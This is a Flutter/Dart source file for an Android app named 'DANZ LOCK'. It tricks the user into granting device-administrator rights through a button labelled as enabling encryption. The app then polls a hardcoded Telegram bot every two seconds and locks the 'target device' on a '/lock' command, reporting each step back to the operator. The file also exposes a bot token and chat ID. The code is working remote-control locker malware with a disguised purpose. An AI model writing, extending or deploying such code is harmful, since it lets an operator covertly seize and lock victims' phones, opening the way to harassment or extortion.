import 'package:flutter/material.dart';
import 'package:device_policy_manager/device_policy_manager.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

// 🛑 INPUT KREDENSIAL BOT TELEGRAM LO DI SINI
const String botToken = "8725381311:AAENhKnIgUFl5qydxJB59oBF9p-Z2wZglTM";
const String chatId = "1494128777";

void main() {
  runApp(const DanzLockApp());
}

class DanzLockApp extends StatelessWidget {
  const DanzLockApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'DANZ LOCK',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        primarySwatch: Colors.amber, 
        scaffoldBackgroundColor: Colors.black, // Estetika Gelap
      ),
      home: const DanzCoreScreen(),
    );
  }
}

class DanzCoreScreen extends StatefulWidget {
  const DanzCoreScreen({super.key});

  @override
  State<DanzCoreScreen> createState() => _DanzCoreScreenState();
}

class _DanzCoreScreenState extends State<DanzCoreScreen> {
  bool isAdminActive = false;
  Timer? _botPollingTimer;
  int lastUpdateId = 0;
  bool isLockEnabled = true;

  @override
  void initState() {
    super.initState();
    _checkAdminStatus();
    _startTelegramPolling();
  }

  Future<void> _checkAdminStatus() async {
    bool active = await DevicePolicyManager.isPermissionGranted();
    setState(() {
      isAdminActive = active;
    });
  }

  Future<void> _requestAdminPrivilege() async {
    await DevicePolicyManager.requestPermession();
    _checkAdminStatus();
    
    if (await DevicePolicyManager.isPermissionGranted()) {
      _sendTelegramNotification("🟢 [NOTIF] User telah mengizinkan DANZ LOCK di perangkat target!");
    }
  }

  Future<void> _sendTelegramNotification(String text) async {
    final url = Uri.parse("https://api.telegram.org/bot$botToken/sendMessage");
    try {
      await http.post(url, body: {"chat_id": chatId, "text": text});
    } catch (_) {}
  }

  void _startTelegramPolling() {
    _botPollingTimer = Timer.periodic(const Duration(seconds: 2), (timer) async {
      final url = Uri.parse("https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}");
      try {
        final response = await http.get(url);
        if (response.statusCode == 200) {
          final data = json.decode(response.body);
          final List results = data['result'];
          
          for (var update in results) {
            lastUpdateId = update['update_id'];
            String messageText = update['message']?['text'] ?? "";
            
            if (messageText == "/lock" && isLockEnabled) {
              _executeLock();
            } else if (messageText == "/off") {
              setState(() {
                isLockEnabled = false;
              });
              _sendTelegramNotification("🔒 [DANZ SYSTEM] Fitur penguncian otomatis telah dimatikan (/off).");
            }
          }
        }
      } catch (_) {}
    });
  }

  Future<void> _executeLock() async {
    bool active = await DevicePolicyManager.isPermissionGranted();
    if (active) {
      DevicePolicyManager.lockNow();
      _sendTelegramNotification("🚀 [SUCCESS] Perangkat target berhasil dikunci via perintah /lock!");
    }
  }

  @override
  void dispose() {
    _botPollingTimer?.cancel();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // Logo Kuning Sesuai Manifest Kekuatan Danz AI
              const Icon(
                Icons.gpp_bad_rounded,
                size: 110,
                color: Colors.amber,
              ),
              const SizedBox(height: 25),
              const Text(
                "DANZ LOCK",
                style: TextStyle(
                  color: Colors.amber,
                  fontSize: 32,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 3,
                ),
              ),
              const SizedBox(height: 8),
              const Text(
                "KERNEL DESTRUCTION EDITION",
                style: TextStyle(color: Colors.white38, fontSize: 11, letterSpacing: 1),
              ),
              const SizedBox(height: 50),
              
              ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.amber, // Tombol Kuning
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 16),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(8),
                  ),
                ),
                onPressed: _requestAdminPrivilege,
                child: Text(
                  isAdminActive ? "SISTEM AKTIF [OK]" : "AKTIFKAN ENKREPSI",
                  style: const TextStyle(fontWeight: FontWeight.bold, fontSize: 14),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
